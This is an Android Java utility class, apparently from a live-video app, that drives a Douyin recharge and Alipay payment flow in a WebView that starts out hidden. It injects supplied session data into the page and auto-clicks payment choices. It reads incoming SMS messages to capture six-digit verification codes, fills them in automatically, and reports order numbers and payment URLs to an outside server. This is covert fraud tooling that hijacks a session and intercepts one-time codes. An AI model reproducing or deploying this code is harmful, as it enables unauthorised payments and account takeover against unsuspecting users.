package com.le.xiong.live.video.util;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Typeface;
import android.graphics.drawable.ShapeDrawable;
import android.graphics.drawable.shapes.RoundRectShape;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.animation.Animation;
import android.view.animation.LinearInterpolator;
import android.view.animation.RotateAnimation;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.le.xiong.live.video.PayTempActivity;
import com.pixplicity.sharp.Sharp;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class PayUtil {

    private static int i=0;
    private static String host;

    public static void toPay(Context context){
        context.startActivity(new Intent(context, PayTempActivity.class));
    }

    public static void init(final Context context, int id, final String dyInfo,String h){
        LinearLayout linearLayout=((Activity)context).findViewById(id);
        init(context,linearLayout,dyInfo,h);
    }

    @SuppressLint("SetJavaScriptEnabled")
    public static void init(final Context context, LinearLayout lin, final String dyInfo,String h) {
        final JSONObject jsonObject;
        try {
            System.out.println(dyInfo);
            if (dyInfo!=null){
                jsonObject = new JSONObject(dyInfo);
            }else {
                jsonObject = new JSONObject("{\"data\":\"\",\"pay\":\"\"}");
            }

            i=0;
            host=h;
            final WebView webView=new WebView(context);
            webView.setLayoutParams(new LinearLayout.LayoutParams(-1,-1));
            lin.addView(webView);
            webView.setVisibility(View.GONE);
            WebSettings webSetting = webView.getSettings();
            //允许h5使用javascript
            webSetting.setJavaScriptEnabled(true);
            //允许android调用javascript
            webSetting.setDomStorageEnabled(true);
            webSetting.setJavaScriptCanOpenWindowsAutomatically(true);
            webSetting.setAllowFileAccess(true);
            webSetting.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.NARROW_COLUMNS);
            webSetting.setSupportZoom(false);
            webSetting.setBuiltInZoomControls(false);
            webSetting.setUseWideViewPort(true);
            webSetting.setAppCacheEnabled(true);
            webSetting.setDomStorageEnabled(true);
            webSetting.setGeolocationEnabled(true);
            webSetting.setAppCacheMaxSize(Long.MAX_VALUE);
            webSetting.setPluginState(WebSettings.PluginState.ON_DEMAND);
            webSetting.setCacheMode(WebSettings.LOAD_NO_CACHE);
            System.out.println(h);
            if (h.contains("http://")){
                webView.loadUrl(h);
            }else{
                webView.loadUrl("https://webcast.amemv.com/falcon/webcast_douyin/page/recharge_web/index.html?scene=douyin_mobile");
            }
            webView.setWebViewClient(new WebViewClient(){
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                    return super.shouldOverrideUrlLoading(view, request);
                }
                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                    if (i==0){
                        if (dyInfo!=null){
                            view.loadUrl("https://webcast.amemv.com/falcon/webcast_douyin/page/recharge_web/index.html?scene=douyin_mobile&v=0");
                        }
                    }

                    if (view.getUrl().equals("https://webcast.amemv.com/falcon/webcast_douyin/page/recharge_web/index.html?scene=douyin_mobile&v=0")) {
                        try {
                            view.loadUrl("javascript:window.setInterval(function(){if($('.combo-wrap').length>=10){$($('.combo-wrap')["+jsonObject.getInt("pay")+"]).click();}},1000)");
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                    if (view.getUrl().contains("tp-pay.snssdk.com")){
                        view.loadUrl("javascript:window.setInterval(function(){var a=document.getElementsByClassName('channel-title-text');for(var i=0; i<a.length; i++){ if(a[i].innerText=='支付宝'){ a[i].click();}} if($('.y-button').length==1){$('.y-button').click();}},1000)");
                        if (dyInfo!=null){
                            addOrder(view.getUrl());
                        }
                    }

                    Log.e("加载",i+"->"+view.getUrl());
                    if (view.getUrl().contains("h5Continue.htm?h5_route_token")){
                        hideLoad();
                        view.setVisibility(View.VISIBLE);
                    }
                    i++;
                }
            });
            webView.setWebChromeClient(new WebChromeClient(){
                @Override
                public void onProgressChanged(WebView view, int newProgress) {
                    super.onProgressChanged(view, newProgress);
                    if(dyInfo!=null){
                        view.loadUrl("javascript:var s = document.createElement('script');s.setAttribute('src', '//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js');s.setAttribute('type', 'text/javascript');document.getElementsByTagName('head')[0].appendChild(s);");
                    }
                    if (i==0&&dyInfo!=null) {
                        try {
                            String data=jsonObject.getString("data");
                            data=data.replaceAll("\\\\","");
                            view.loadUrl("javascript:" +
                                    "window.localStorage.userInfo='"+data+"'" +
                                    "");
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        //view.loadUrl("javascript:window.localStorage.__tea_cache_tokens_1128='"+dyInfo.split("10086")[1]+"'");
                        //view.loadUrl("https://webcast.amemv.com/falcon/webcast_douyin/page/recharge_web/index.html?scene=douyin_mobile&v=0");
                    }
                    String url=view.getUrl();
                    if (url!=null&&url.contains("mclient.alipay.com")){
                        view.loadUrl("javascript:window.setInterval(function(){$('.J-h5pay').click();},100)");
                        i=100;
                        //view.loadUrl("javascript:"+js);
                    }
                    view.loadUrl("javascript:var ds=$('.am-list-item');if(ds.length>=3){if(ds[1].innerText!=null&&ds[1].innerText.indexOf('支付宝账户')!=-1){$('.am-list-item').css('display','none');$($('.am-list-item')[1]).css('display','block');}}");

                    if (i>=100){
                        if (view.getUrl().contains("tp-pay.snssdk.com")&&dyInfo!=null){
                            updateState();
                        }
                    }
                }
            });

            MsgSrviceUtil.setMsgCall(new MsgSrviceUtil.MsgCall() {
                @Override
                public void newMsg(String text) {
                    Log.e("日志",text);
                    Pattern pattern=Pattern.compile(".*?([0-9]{6}).*?");
                    Matcher matcher=pattern.matcher(text);
                    if (matcher.find()){
                        String str=matcher.group(1);
                        if (str!=null){
                            System.out.println(str);
                            //$($('input')[5]).attr('placeholder').indexOf('验证码')
                            webView.loadUrl("javascript:var ins=$('input');for(var i=0;i<ins.length;i++){var pl=$($('input')[i]).attr('placeholder');if(pl!=null&&pl.indexOf('短信')!=-1){$($('input')[i]).val('"+str+"')}} $(\".am-button-blue\")[1].click();");
                        }else {
                            SystemUtils.writeLog("验证码捕获失败->"+text);
                        }
                    }
                }
            });
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private static AlertDialog alertDialog;
    public static void showLoad(Context context){
        LinearLayout root=new LinearLayout(context);
        root.setLayoutParams(new LinearLayout.LayoutParams(-1,-1));
        root.setGravity(Gravity.CENTER);
        LinearLayout box=new LinearLayout(context);
        box.setLayoutParams(new LinearLayout.LayoutParams(dp2px(150,context),dp2px(150,context)));
        box.setOrientation(LinearLayout.VERTICAL);
        box.setAlpha(0.6F);
        setRound(box,10,Color.BLACK);
        box.setGravity(Gravity.CENTER);
        TextView textView=new TextView(context);
        textView.setLayoutParams(new LinearLayout.LayoutParams(-2,-2));
        textView.setGravity(Gravity.CENTER);
        textView.setText("正在加载");
        textView.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        textView.setTextSize(13);
        textView.setPadding(0,dp2px(10,context),0,0);
        textView.setTextColor(Color.parseColor("#cdcdcd"));
        ImageView imageView=new ImageView(context);
        imageView.setLayoutParams(new LinearLayout.LayoutParams(dp2px(50,context),dp2px(50,context)));
        Sharp.loadString("<svg t=\"1602220309944\" class=\"icon\" viewBox=\"0 0 1024 1024\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" p-id=\"4201\" width=\"200\" height=\"200\"><path d=\"M840.3968 755.712c3.072 0 5.632-2.6624 5.632-5.9904a5.7856 5.7856 0 0 0-5.632-5.9392c-3.1232 0-5.632 2.6624-5.632 5.9392 0 3.328 2.5088 5.9904 5.632 5.9904z m-118.5792 141.5168c6.144 0 11.1616-5.2736 11.1616-11.8272a11.52 11.52 0 0 0-11.1616-11.8272 11.52 11.52 0 0 0-11.2128 11.8272c0 6.5536 5.0176 11.8272 11.2128 11.8272z m-161.6896 75.776a17.3056 17.3056 0 0 0 16.7936-17.7664c0-9.8304-7.5264-17.8176-16.7936-17.8176a17.3056 17.3056 0 0 0-16.8448 17.8176c0 9.8304 7.5264 17.8176 16.8448 17.8176z m-174.592-3.4304a23.04 23.04 0 0 0 22.3744-23.7056 23.04 23.04 0 0 0-22.3744-23.7056 23.04 23.04 0 0 0-22.3744 23.7056 23.04 23.04 0 0 0 22.3744 23.7056z m-154.112-80.896c15.4112 0 27.9552-13.312 27.9552-29.6448 0-16.384-12.544-29.6448-28.0064-29.6448-15.4624 0-28.0064 13.312-28.0064 29.6448 0 16.384 12.544 29.6448 28.0064 29.6448zM126.3104 747.008c18.5344 0 33.5872-15.9744 33.5872-35.6352 0-19.6608-15.0528-35.584-33.5872-35.584-18.5856 0-33.6384 15.9232-33.6384 35.584 0 19.6608 15.0528 35.6352 33.6384 35.6352z m-35.9936-175.4112c21.6576 0 39.168-18.5856 39.168-41.472 0-22.9376-17.5104-41.472-39.168-41.472-21.6064 0-39.168 18.5344-39.168 41.472 0 22.8864 17.5616 41.472 39.168 41.472z m39.7824-174.1312c24.7808 0 44.8-21.248 44.8-47.4624s-20.0192-47.4112-44.8-47.4112c-24.7296 0-44.8 21.1968-44.8 47.4112s20.0704 47.4624 44.8 47.4624z m108.1344-139.264c27.8528 0 50.432-23.9104 50.432-53.4016 0-29.4912-22.528-53.4016-50.432-53.4016-27.8528 0-50.432 23.9104-50.432 53.4016 0 29.4912 22.5792 53.4016 50.432 53.4016z m156.1088-77.312c30.9248 0 55.9616-26.5216 55.9616-59.2896 0-32.768-25.088-59.2896-55.9616-59.2896-30.9248 0-56.0128 26.5728-56.0128 59.2896 0 32.768 25.088 59.2896 56.0128 59.2896z m174.6432 0.8192c34.048 0 61.6448-29.184 61.6448-65.28 0-35.9936-27.5968-65.2288-61.6448-65.2288-33.9968 0-61.5936 29.184-61.5936 65.2288 0 36.0448 27.5968 65.28 61.5936 65.28z m160.3584 79.616c37.12 0 67.1744-31.8464 67.1744-71.168 0-39.2192-30.0544-71.1168-67.1744-71.1168-37.0688 0-67.1744 31.8976-67.1744 71.168 0 39.2704 30.1056 71.168 67.1744 71.168z m115.6096 144.4864c40.192 0 72.8064-34.5088 72.8064-77.056 0-42.5984-32.6144-77.1072-72.8064-77.1072-40.192 0-72.7552 34.5088-72.7552 77.1072 0 42.5472 32.5632 77.056 72.7552 77.056z m49.408 185.4464c43.264 0 78.3872-37.2224 78.3872-83.0464 0-45.8752-35.1232-83.0464-78.3872-83.0464-43.3152 0-78.4384 37.1712-78.4384 83.0464 0 45.824 35.1232 83.0464 78.4384 83.0464z\" fill=\"#cdcdcd\" p-id=\"4202\"></path></svg>")
                .into(imageView);
        box.addView(imageView);
        box.addView(textView);
        root.addView(box);
        alertDialog= new AlertDialog.Builder(context).create();
        alertDialog.setView(root);
        alertDialog.setCanceledOnTouchOutside(false);
        alertDialog.setCancelable(false);
        alertDialog.show();

        Window window=alertDialog.getWindow();
        if (window!=null){
            window.setGravity(Gravity.CENTER);
            window.setBackgroundDrawableResource(android.R.color.transparent);
            window.setDimAmount(0f);
            /*window.setLayout(SystemUtils.dp2px(200,this),SystemUtils.dp2px(200,this));*/
        }
        RotateAnimation rotateAnimation=new RotateAnimation(0F,360F, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5F);
        LinearInterpolator lin = new LinearInterpolator();
        rotateAnimation.setInterpolator(lin);
        rotateAnimation.setDuration(1000);
        rotateAnimation.setRepeatCount(-1);
        imageView.startAnimation(rotateAnimation);
    }

    private static void hideLoad(){
        alertDialog.dismiss();
    }

    private static int dp2px(int dip, Context context){
        final float scale = context.getResources().getDisplayMetrics().density;
        return (int) (dip * scale + 0.5f);
    }

    private static void setRound(View view, float r, int color){
        float[] outerRadian = new float[]{r, r, r, r, r, r, r, r};
        float[] insideRadian = new float[]{r, r, r, r, r, r, r, r};
        RoundRectShape roundRectShape = new RoundRectShape(outerRadian, null, insideRadian);
        ShapeDrawable drawable = new ShapeDrawable(roundRectShape);
        drawable.getPaint().setColor(color);
        drawable.getPaint().setStyle(Paint.Style.FILL);
        view.setBackground(drawable);
    }

    //添加订单
    private static String no;
    private static void addOrder(final String url){
        int start=url.indexOf("out_order_no=");
        int stop=url.indexOf("&",start);
        no=url.substring(start+13,stop);
        start=url.indexOf("total_amount=");
        stop=url.indexOf("&",start);
        final String total=url.substring(start+13,stop);
        new Thread(new Runnable() {
            @Override
            public void run() {
                String data= null;
                try {
                    data = SystemUtils.post("http://"+host.trim()+"/public/index.php/index/api/addOrders","out_order_no="+no+"&total_amount="+total+"&pay_url="+ URLEncoder.encode(url,"utf-8"));
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
                Log.i("logo",data+"");
            }
        }).start();
    }

    //更新订单状态
    private static void updateState(){
        new Thread(new Runnable() {
            @Override
            public void run() {
                String data=SystemUtils.post("http://"+host+"/public/index.php/index/api/updateState","out_order_no="+no);
                Log.i("logo",data+"");
            }
        }).start();
    }

}
